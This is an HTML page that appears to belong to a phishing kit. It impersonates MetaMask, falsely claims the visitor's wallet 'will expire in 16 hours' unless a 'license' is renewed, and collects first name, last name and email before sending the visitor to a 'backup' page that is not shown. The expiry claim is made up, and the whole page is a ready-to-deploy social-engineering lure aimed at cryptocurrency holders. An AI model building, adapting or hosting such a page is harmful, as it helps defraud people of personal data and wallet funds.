<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" media="all" href="/css/style.css" type="text/css">
    <title>MetaMask | Renew your wallet license</title>
</head>
<body>
    <div class="container">
        <div class="intro-section">
            <div class="logo-img">
                <a href="./index.html">
                    <img src="./media/metamask logo.png" alt="MetaMask logo">
                </a>
            </div>
        </div>
        <div class="form-section">
            <div class="form-text">
                <h3>Renew your wallet lincense if you still need it</h3>
                <p class="parag-text">
                    Dear MetaMasker, we would like to just quickly remind you
                    that your 
                    <span class="strong-text">Metamask wallet will expire in 16 hours.</span>
                </p>
                <p>
                    Confirm that you use your MetaMask wallet.
                </p>
            </div>
            <div class="form-input">
                <form action="backup.html" id="f-form" method="post">
                    <div class="fname">
                        <label for="fname">First name:</label><br>
                        <input type="text" name="fname" required>
                    </div>
                    <div class="lname">
                        <label for="lname">Last name:</label><br>
                        <input type="text" name="lname" required>
                    </div>
                    <div class="email">
                        <label for="email">Email:</label><br>
                        <input type="email" name="email" required>
                    </div>
                </form>
            </div>
            <button type="submit" name="submit" form="f-form" class="next-btn">Next</button>
        </div>
    </div>
</body>
</html>
